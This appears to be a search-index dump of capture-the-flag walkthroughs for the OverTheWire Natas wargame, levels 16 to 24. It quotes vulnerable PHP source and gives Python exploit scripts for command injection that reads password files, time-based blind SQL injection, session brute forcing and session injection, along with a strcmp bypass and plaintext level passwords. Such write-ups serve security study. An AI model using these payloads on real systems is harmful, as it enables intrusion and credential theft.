\"\";\n\nif(array_key_exists(\"needle\", $_REQUEST)) {\n    $key = $_REQUEST[\"needle\"];\n}\n\nif($key != \"\") {\n    if(preg_match('/[;|&amp;`\\'\"]/',$key)) {\n        print \"Input contains an illegal character!\";\n    } else {\n        passthru(\"grep -i \\\"$key\\\" dictionary.txt\");\n    }\n}\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas16/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#observation","title":"Observation","text":"<p>Some characters are filtered. Our payload should contain <code>/etc/natas_webpass/natas17</code> in order to interact with the password.</p>"},{"location":"CTFs/over-the-wire/natas/natas16/#payload","title":"Payload","text":"<p>QQ</p>"},{"location":"CTFs/over-the-wire/natas/natas16/#program","title":"Program","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\n\ndef request_with_password(password : str) -&gt; bool:\n    payload = f\"?needle=$(grep ^{password} /etc/natas_webpass/natas17)&amp;submit=Search\"\n    return request_with_payload(payload)\n\ndef request_with_payload(payload: str):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==\",\n    }\n    url = \"http://natas16.natas.labs.overthewire.org/\"\n    url += payload\n    response = requests.get(url, headers=header)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('pre')\n    return \"African\" not in content.__str__()\n\ndef main():\n    success_password = \"\"\n    letters = 'abcdefghijklmnopqrstuvwxyz'\n    candidates = letters + letters.upper() + \"0123456789\"\n    while True:\n        for candidate in candidates:\n            if request_with_password(success_password + candidate):\n                success_password += candidate\n                print(success_password)\n                break\n        else:\n            print(f\"password : {success_password}\")\n            break\n\nmain()\n</code></pre> XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd</p>"},{"location":"CTFs/over-the-wire/natas/natas16/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas16/#tools","title":"Tools","text":"<ul> <li>[[grep]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas17/","title":"natas 17 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas17/#description","title":"Description","text":"<p>Username: natas17</p> <p>URL:      http://natas17.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas17/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\n/*\nCREATE TABLE `users` (\n  `username` varchar(64) DEFAULT NULL,\n  `password` varchar(64) DEFAULT NULL\n);\n*/\n\nif (array_key_exists(\"username\", $_REQUEST)) {\n    $link = mysqli_connect('localhost', 'natas17', '&lt;censored&gt;');\n    mysqli_select_db($link, 'natas17');\n\n    $query = \"SELECT * from users where username=\\\"\" . $_REQUEST[\"username\"] . \"\\\"\";\n    if (array_key_exists(\"debug\", $_GET)) {\n        echo \"Executing query: $query&lt;br&gt;\";\n    }\n\n    $res = mysqli_query($link, $query);\n    if ($res) {\n        if (mysqli_num_rows($res) &gt; 0) {\n            //echo \"This user exists.&lt;br&gt;\";\n        } else {\n            //echo \"This user doesn't exist.&lt;br&gt;\";\n        }\n    } else {\n        //echo \"Error in query.&lt;br&gt;\";\n    }\n    mysqli_close($link);\n} else {\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas17/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas17/#observation","title":"Observation","text":"<p>Seems we cannot get anything different with different inputs. Try to see if it is true. It seems like that. However, there's a line which output the query. Therefore, use the url <code>http://natas17.natas.labs.overthewire.org/?debug=true&amp;username=a</code>.</p>"},{"location":"CTFs/over-the-wire/natas/natas17/#trial","title":"Trial","text":"<p>From this article, it seems we can only achieve [[XSS]] via the only echo line.  We cannot get anything different by the output. Time may be a way to distinguish the difference. [[Time Delay SQL Injection]]</p>"},{"location":"CTFs/over-the-wire/natas/natas17/#script","title":"Script","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\n\nWAITING_TIME_SECONDS = 4\n\ndef request_with_password(password : str) -&gt; bool:\n    payload = f\"natas18\\\" and if(password like binary \\\"{password}%\\\", sleep({WAITING_TIME_SECONDS}), 'no') -- \"\n    return request_with_payload(f\"?debug=true&amp;username={payload}\")\n\ndef request_with_payload(payload: str):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==\",\n    }\n    url = \"http://natas17.natas.labs.overthewire.org/index.php\"\n    url += payload\n    time_before_request = datetime.now()\n    response = requests.get(url, headers=header)\n    time_after_request = datetime.now()\n    waiting_time = (time_after_request - time_before_request).total_seconds()\n    return waiting_time &gt; WAITING_TIME_SECONDS\n\ndef main():\n    success_password = \"8\"\n    letters = 'abcdefghijklmnopqrstuvwxyz'\n    candidates = letters + letters.upper() + \"0123456789\"\n    while True:\n        for candidate in candidates:\n            if request_with_password(success_password + candidate):\n                success_password += candidate\n                print(success_password)\n                break\n        else:\n            print(f\"password : {success_password}\")\n            break\n\nmain()\n</code></pre> The script is awful, since the delay may differ from time to time due to the speed of internet. One may want to check again when get a part of the password. Still can find the password : 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq</p>"},{"location":"CTFs/over-the-wire/natas/natas17/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas17/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas17/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas17/#techniques","title":"Techniques","text":"<ul> <li>[[sql injection MOC]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas17/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas18/","title":"natas 18 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#description","title":"Description","text":"<p>Username: natas18</p> <p>URL:      http://natas18.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas18/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\n$maxid = 640; // 640 should be enough for everyone\n\nfunction isValidAdminLogin()\n{ \n    if ($_REQUEST[\"username\"] == \"admin\") {\n        /* This method of authentication appears to be unsafe and has been disabled for now. */\n        //return 1;\n    }\n\n    return 0;\n}\nfunction isValidID($id)\n{ \n    return is_numeric($id);\n}\nfunction createID($user)\n{ \n    global $maxid;\n    return rand(1, $maxid);\n}\n\nfunction debug($msg)\n{ \n    if (array_key_exists(\"debug\", $_GET)) {\n        print \"DEBUG: $msg&lt;br&gt;\";\n    }\n}\n\nfunction my_session_start()\n{ \n    if (array_key_exists(\"PHPSESSID\", $_COOKIE) and isValidID($_COOKIE[\"PHPSESSID\"])) {\n        if (!session_start()) {\n            debug(\"Session start failed\");\n            return false;\n        } else {\n            debug(\"Session start ok\");\n            if (!array_key_exists(\"admin\", $_SESSION)) {\n                debug(\"Session was old: admin flag set\");\n                $_SESSION[\"admin\"] = 0; // backwards compatible, secure\n            }\n            return true;\n        }\n    }\n\n    return false;\n}\n\nfunction print_credentials()\n{ \n    if ($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) {\n        print \"You are an admin. The credentials for the next level are:&lt;br&gt;\";\n        print \"&lt;pre&gt;Username: natas19\\n\";\n        print \"Password: &lt;censored&gt;&lt;/pre&gt;\";\n    } else {\n        print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\";\n    }\n}\n\n\n$showform = true;\nif (my_session_start()) {\n    print_credentials();\n    $showform = false;\n} else {\n    if (array_key_exists(\"username\", $_REQUEST) &amp;&amp; array_key_exists(\"password\", $_REQUEST)) {\n        session_id(createID($_REQUEST[\"username\"]));\n        session_start();\n        $_SESSION[\"admin\"] = isValidAdminLogin();\n        debug(\"New session started\");\n        $showform = false;\n        print_credentials();\n    }\n}\n\nif ($showform) {\n}\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas18/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#observation","title":"Observation","text":"<p>Using session ID to distinguish user identity. We need to pass <code>print_credentials</code>. Session ID seems to be an integer and inbetween $[1,640]$. Therefore, try all the session ID.</p>"},{"location":"CTFs/over-the-wire/natas/natas18/#pwn","title":"Pwn","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\n\ndef request_with_session_id(id :int):\n    request_with_cookie({\n        \"PHPSESSID\" : str(id)\n    })\n\ndef request_with_cookie(cookie):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==\",\n    }\n    url = \"http://natas18.natas.labs.overthewire.org/index.php\"\n    response = requests.get(url, headers=header, cookies=cookie)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    if \"You are an admin\" in content.__str__():\n        print(content)\n    else:\n        pass\n\ndef main():\n    for i in range(1,641):\n        request_with_session_id(i)\n\nmain()\n</code></pre> 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s</p>"},{"location":"CTFs/over-the-wire/natas/natas18/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas18/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas19/","title":"natas 19 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#description","title":"Description","text":"<p>Username: natas19</p> <p>URL:      http://natas19.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas19/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#observation","title":"Observation","text":"<p>Session ID are not sequential, but they seem similar.</p>"},{"location":"CTFs/over-the-wire/natas/natas19/#analyze","title":"Analyze","text":"<p>Get 500 session IDs and analyze them. It seems the session IDs always start with 3 and end with 2d226122. After strip those things. Session IDs can be divided into three parts: <code>[\\d]</code>, <code>[3\\d]</code>,<code>[3\\d]</code>. Therefore, try them. However, from the script, we cannot crack the session ID. After some tries, it seems that the session ID contains username in it, just right after the 2d22 part. <code>a</code> was encoded as <code>61</code>. <code>b</code> was encoded as <code>62</code>, and so on. It seems to be ascii in hex. Therefore, we can guess there are three digits of number, and followed by <code>-&lt;username&gt;</code>.</p>"},{"location":"CTFs/over-the-wire/natas/natas19/#script","title":"Script","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\n\ndef request_with_session_id(id :str):\n    request_with_cookie({\n        \"PHPSESSID\" : f\"{id}\",\n    })\n\ndef request_with_cookie(cookies):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==\",\n    }\n    url = \"http://natas19.natas.labs.overthewire.org/index.php\"\n    response = requests.get(url, headers=header, cookies=cookies)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    if response.status_code == 200:\n        print(f\"trying session id = {cookies[\"PHPSESSID\"]}\")\n    if \"You are an admin\" in content.__str__():\n        print(content)\n        exit()\n    elif \"Please login with your admin account\" in content.__str__():\n        print(content)\n        exit()\n    else:\n        pass\n\ndef add_characteristic(raw):\n    return raw + \"2d61646d696e\"\n\ndef main():\n    thirty = [str(i) for i in range(30, 40)]\n    for part1 in thirty:\n        request_with_session_id(add_characteristic(part1))\n        for part2 in thirty:\n            request_with_session_id(add_characteristic(part1+part2))\n            for part3 in thirty:\n                request_with_session_id(add_characteristic(part1+part2+part3))\n\ndef get_cookies():\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==\",\n    }\n    username = \"admin\"\n    password = \"AA\"\n    url = f\"http://natas19.natas.labs.overthewire.org/index.php?username=\\\"{username}\\\"&amp;password=\\\"{password}\\\"\"\n    session_ids = []\n    for i in range(300):\n        response = requests.get(url, headers=header)\n        session_ids.append(response.cookies.get(\"PHPSESSID\"))\n    print(session_ids)\n\ndef analyze_cookie():\n    cookies = []\n    for i in range(len(cookies)):\n        if cookies[i][0] != \"3\":\n            print(cookies[i])\n            exit()\n        elif cookies[i][-16:] != \"2d61646d696e\":\n            print(cookies[i])\n            exit()\n        cookies[i] = cookies[i][1:-12]\n    cookies.sort()\n    print(cookies)\n\nmain()\n</code></pre> guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH</p>"},{"location":"CTFs/over-the-wire/natas/natas19/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas19/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas20/","title":"natas 20 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#description","title":"Description","text":"<p>Username: natas20</p> <p>URL:      http://natas20.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas20/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\nfunction debug($msg)\n{ \n    if (array_key_exists(\"debug\", $_GET)) {\n        print \"DEBUG: $msg&lt;br&gt;\";\n    }\n}\n\nfunction print_credentials()\n{ \n    if ($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) {\n        print \"You are an admin. The credentials for the next level are:&lt;br&gt;\";\n        print \"&lt;pre&gt;Username: natas21\\n\";\n        print \"Password: &lt;censored&gt;&lt;/pre&gt;\";\n    } else {\n        print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\";\n    }\n}\n\n\n/* we don't need this */\nfunction myopen($path, $name)\n{\n    //debug(\"MYOPEN $path $name\");\n    return true;\n}\n\n/* we don't need this */\nfunction myclose()\n{\n    //debug(\"MYCLOSE\");\n    return true;\n}\n\nfunction myread($sid)\n{\n    debug(\"MYREAD $sid\");\n    if (strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {\n        debug(\"Invalid SID\");\n        return \"\";\n    }\n    $filename = session_save_path() . \"/\" . \"mysess_\" . $sid;\n    if (!file_exists($filename)) {\n        debug(\"Session file doesn't exist\");\n        return \"\";\n    }\n    debug(\"Reading from \" . $filename);\n    $data = file_get_contents($filename);\n    $_SESSION = array();\n    foreach (explode(\"\\n\", $data) as $line) {\n        debug(\"Read [$line]\");\n        $parts = explode(\" \", $line, 2);\n        if ($parts[0] != \"\") $_SESSION[$parts[0]] = $parts[1];\n    }\n    return session_encode();\n}\n\nfunction mywrite($sid, $data)\n{\n    // $data contains the serialized version of $_SESSION\n    // but our encoding is better\n    debug(\"MYWRITE $sid $data\");\n    // make sure the sid is alnum only!!\n    if (strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {\n        debug(\"Invalid SID\");\n        return;\n    }\n    $filename = session_save_path() . \"/\" . \"mysess_\" . $sid;\n    $data = \"\";\n    debug(\"Saving in \" . $filename);\n    ksort($_SESSION);\n    foreach ($_SESSION as $key =&gt; $value) {\n        debug(\"$key =&gt; $value\");\n        $data .= \"$key $value\\n\";\n    }\n    file_put_contents($filename, $data);\n    chmod($filename, 0600);\n}\n\n/* we don't need this */\nfunction mydestroy($sid)\n{\n    //debug(\"MYDESTROY $sid\");\n    return true;\n}\n/* we don't need this */\nfunction mygarbage($t)\n{\n    //debug(\"MYGARBAGE $t\");\n    return true;\n}\n\nsession_set_save_handler(\n    \"myopen\",\n    \"myclose\",\n    \"myread\",\n    \"mywrite\",\n    \"mydestroy\",\n    \"mygarbage\"\n);\nsession_start();\n\nif (array_key_exists(\"name\", $_REQUEST)) {\n    $_SESSION[\"name\"] = $_REQUEST[\"name\"];\n    debug(\"Name set to \" . $_REQUEST[\"name\"]);\n}\n\nprint_credentials();\n\n$name = \"\";\nif (array_key_exists(\"name\", $_SESSION)) {\n    $name = $_SESSION[\"name\"];\n}\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas20/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#observation","title":"Observation","text":"<p>Since session is stored as serialized version, one may give some illegal input to overwrite the admin attribute.</p>"},{"location":"CTFs/over-the-wire/natas/natas20/#trial","title":"Trial","text":"<p>Try <code>name\\nadmin 1</code>. It does not work. It seems that <code>\\n</code> cannot be input as a value of form by browser. Need to write a script.</p>"},{"location":"CTFs/over-the-wire/natas/natas20/#pwn","title":"Pwn","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\n\ndef request_with_session_id(input_name):\n    return request_with_payload(f\"name={input_name}\")\n\ndef request_with_payload(payload):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==\",\n    }\n    url = \"http://natas20.natas.labs.overthewire.org/index.php?\" + payload\n    response = requests.get(url, headers=header)\n    return response.cookies\n\ndef request_with_cookie(cookies):\n    header = {\n        \"Authorization\" : \"Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==\",\n    }\n    url = \"http://natas20.natas.labs.overthewire.org/index.php?\"\n    response = requests.get(url, headers=header, cookies=cookies)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    if \"You are an admin\" in content.__str__():\n        print(content)\n    else:\n        print(\"failed\")\n\ndef main():\n    cookies = request_with_session_id(\"b\\nadmin 1\")\n    request_with_cookie(cookies)\n\nmain()\n</code></pre> 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56</p>"},{"location":"CTFs/over-the-wire/natas/natas20/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas20/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas21/","title":"natas 21 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#description","title":"Description","text":"<p>Username: natas21</p> <p>URL:      http://natas21.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas21/#source-code","title":"Source Code","text":"<p>http://natas21.natas.labs.overthewire.org/index.php :  <pre><code>&lt;?php\n\nfunction print_credentials()\n{ \n    if ($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) {\n        print \"You are an admin. The credentials for the next level are:&lt;br&gt;\";\n        print \"&lt;pre&gt;Username: natas22\\n\";\n        print \"Password: &lt;censored&gt;&lt;/pre&gt;\";\n    } else {\n        print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.\";\n    }\n}\n\n\nsession_start();\nprint_credentials();\n</code></pre> http://natas21-experimenter.natas.labs.overthewire.org <pre><code>&lt;?php\n\nsession_start();\n\n// if update was submitted, store it\nif (array_key_exists(\"submit\", $_REQUEST)) {\n    foreach ($_REQUEST as $key =&gt; $val) {\n        $_SESSION[$key] = $val;\n    }\n}\n\nif (array_key_exists(\"debug\", $_GET)) {\n    print \"[DEBUG] Session contents:&lt;br&gt;\";\n    print_r($_SESSION);\n}\n\n// only allow these keys\n$validkeys = array(\"align\" =&gt; \"center\", \"fontsize\" =&gt; \"100%\", \"bgcolor\" =&gt; \"yellow\");\n$form = \"\";\n\n$form .= '&lt;form action=\"index.php\" method=\"POST\"&gt;';\nforeach ($validkeys as $key =&gt; $defval) {\n    $val = $defval;\n    if (array_key_exists($key, $_SESSION)) {\n        $val = $_SESSION[$key];\n    } else {\n        $_SESSION[$key] = $val;\n    }\n    $form .= \"$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;\";\n}\n$form .= '&lt;input type=\"submit\" name=\"submit\" value=\"Update\" /&gt;';\n$form .= '&lt;/form&gt;';\n\n$style = \"background-color: \" . $_SESSION[\"bgcolor\"] . \"; text-align: \" . $_SESSION[\"align\"] . \"; font-size: \" . $_SESSION[\"fontsize\"] . \";\";\n$example = \"&lt;div style='$style'&gt;Hello world!&lt;/div&gt;\";\n</code></pre></p>"},{"location":"CTFs/over-the-wire/natas/natas21/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#observation","title":"Observation","text":"<p>The experimenter page is definitely vulnerable. However, we need to find a way to make it use to crack the main page.</p>"},{"location":"CTFs/over-the-wire/natas/natas21/#trial","title":"Trial","text":"<p>If those two pages share session data. One can inject content into the session via the experimenter page, and using the session ID to retrieve the password from the main page.</p>"},{"location":"CTFs/over-the-wire/natas/natas21/#script","title":"Script","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas21\"\npassword = \"89OWrTkGmiLZLv12JY4tLj2c4FW0xn56\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef get_content(response):\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return content.__str__()\n\ndef main():\n    main_url = \"http://natas21.natas.labs.overthewire.org/index.php\"\n    vul_url = \"http://natas21-experimenter.natas.labs.overthewire.org/index.php\"\n    response = requests.get(vul_url, auth=authentication)\n    sessid_cookie = response.cookies\n    sessid_cookie = {\"PHPSESSID\":response.cookies[\"PHPSESSID\"]}\n\n    response = requests.get(vul_url + \"?debug=true&amp;admin=1&amp;submit=Update\", \n                             cookies=sessid_cookie, auth=authentication)\n    if response.status_code == 200:\n        if \"admin\" not in get_content(response):\n            exit()\n\n    response = requests.get(main_url, cookies=sessid_cookie, auth=authentication)\n    if \"You are an admin\" in get_content(response):\n        print(get_content(response))\n    else:\n        print(\"failed\")\n\nmain()\n</code></pre> 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s</p>"},{"location":"CTFs/over-the-wire/natas/natas21/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas21/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas22/","title":"natas 22 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#description","title":"Description","text":"<p>Username: natas22</p> <p>URL:      http://natas22.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas22/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\nsession_start();\n\nif (array_key_exists(\"revelio\", $_GET)) {\n    // only admins can reveal the password\n    if (!($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1)) {\n        header(\"Location: /\");\n    }\n}\n?&gt;\n\n&lt;?php\nif (array_key_exists(\"revelio\", $_GET)) {\n    print \"You are an admin. The credentials for the next level are:&lt;br&gt;\";\n    print \"&lt;pre&gt;Username: natas23\\n\";\n    print \"Password: &lt;censored&gt;&lt;/pre&gt;\";\n}\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas22/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#observation","title":"Observation","text":"<p><code>revelio</code> is needed to be added into query while we send a get request. After that, one should get the content below.</p>"},{"location":"CTFs/over-the-wire/natas/natas22/#trial","title":"Trial","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas22\"\npassword = \"91awVM9oDiUGm33JdzM7RVLBS8bz9n0s\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef get_content(response):\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return content.__str__()\n\ndef main():\n    main_url = \"http://natas22.natas.labs.overthewire.org/\" \n    payload = \"?revelio=3\" \n    response = requests.get(main_url+payload, auth=authentication)\n    if \"You are an admin\" in get_content(response):\n        print(get_content(response))\n    else:\n        print(\"failed\")\n\nmain()\n</code></pre> I was wrong. I always get status code 200 and an empty page, while I can get the status code 302 (redirection) via chrome. Does python request automatically redirect? <pre><code>$ curl --header 'Authorization: Basic bmF0YXMyMjo5MWF3Vk05b0RpVUdtMzNKZHpNN1JWTEJTOGJ6OW4wcw==' --request GET http://natas22.natas.labs.overthewire.org/\\?revelio\\=3`\n</code></pre> qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj</p> <p>Well, it seems I guess correctly. The auto redirection can be turned off by setting the argument to false. <pre><code>response = requests.get(main_url+payload, auth=authentication, allow_redirects=False)\n</code></pre></p>"},{"location":"CTFs/over-the-wire/natas/natas22/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas22/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas23/","title":"natas 23 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#description","title":"Description","text":"<p>Username: natas23</p> <p>URL:      http://natas23.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas23/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\nif (array_key_exists(\"passwd\", $_REQUEST)) {\n    if (strstr($_REQUEST[\"passwd\"], \"iloveyou\") &amp;&amp; ($_REQUEST[\"passwd\"] &gt; 10)) {\n        echo \"&lt;br&gt;The credentials for the next level are:&lt;br&gt;\";\n        echo \"&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;\";\n    } else {\n        echo \"&lt;br&gt;Wrong!&lt;br&gt;\";\n    }\n}\n// morla / 10111\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas23/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#observation","title":"Observation","text":"<p>I have no idea why the password is compared to a number, but the only thing we need to do is pas the check. This php wiki explained how to compare string to integer.</p>"},{"location":"CTFs/over-the-wire/natas/natas23/#payload","title":"Payload","text":"<p><code>30iloveyou</code> 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r</p>"},{"location":"CTFs/over-the-wire/natas/natas23/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas23/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas24/","title":"natas 24 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#description","title":"Description","text":"<p>Username: natas24</p> <p>URL:      http://natas24.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas24/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\nif (array_key_exists(\"passwd\", $_REQUEST)) {\n    if (!strcmp($_REQUEST[\"passwd\"], \"&lt;censored&gt;\")) {\n        echo \"&lt;br&gt;The credentials for the next level are:&lt;br&gt;\";\n        echo \"&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;\";\n    } else {\n        echo \"&lt;br&gt;Wrong!&lt;br&gt;\";\n    }\n}\n// morla / 10111\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas24/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#observation","title":"Observation","text":"<p>In this document, it says what kind of number would be treated as false in php. No wonder, 0 is the only number would be treated as false. If the two inputs are equal, <code>strcmp</code> returns 0. Therefore, send passwd as <code>&lt;censored&gt;</code> would pass. Wait. How could we send the password before we get it. The only way is to find a weakness in <code>strcmp</code>.</p>"},{"location":"CTFs/over-the-wire/natas/natas24/#survey","title":"Survey","text":"<p>I found php strcmp bypass, and it refers php wiki.  They say when strcmp returns NULL on failure. Moreover, NULL is treated as false.  Then, making the input be any data type that cannot be transferred into string automatically would be fine.</p>"},{"location":"CTFs/over-the-wire/natas/natas24/#trial","title":"Trial","text":"<p>Well, try the input given by those reference. `http://natas24.natas.labs.overthewire.org/?passwd[]=\"\" Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx</p>"},{"location":"CTFs/over-the-wire/natas/natas24/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas24/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas25/","title":"natas 25 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#description","title":"Description","text":"<p>Username: natas25</p> <p>URL:      http://natas25.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas25/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n// 